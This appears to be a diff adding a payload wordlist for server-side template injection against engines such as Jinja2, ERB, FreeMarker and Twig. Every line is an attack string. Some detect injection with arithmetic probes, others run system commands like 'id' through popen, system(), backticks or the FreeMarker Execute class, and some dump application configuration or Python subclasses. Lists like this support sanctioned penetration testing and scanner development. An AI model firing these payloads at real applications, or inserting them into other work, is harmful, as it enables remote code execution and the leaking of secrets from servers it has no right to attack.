@@ -1,0 +1,17 @@
+<%= system('id') %>
+{{config.items()}}
+<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
+*{7*7}
+${{7*7}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{7*7}}
+${7*7}
+{{config}}
+{{self}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{_self.env.display('template.twig')}}
+#{7*7}
+<%= `id` %>
+{{''.__class__.__mro__[1].__subclasses__()}}
+<%= 7*7 %>
+{{_self.env.registerUndefinedFilterCallback('exec')}}
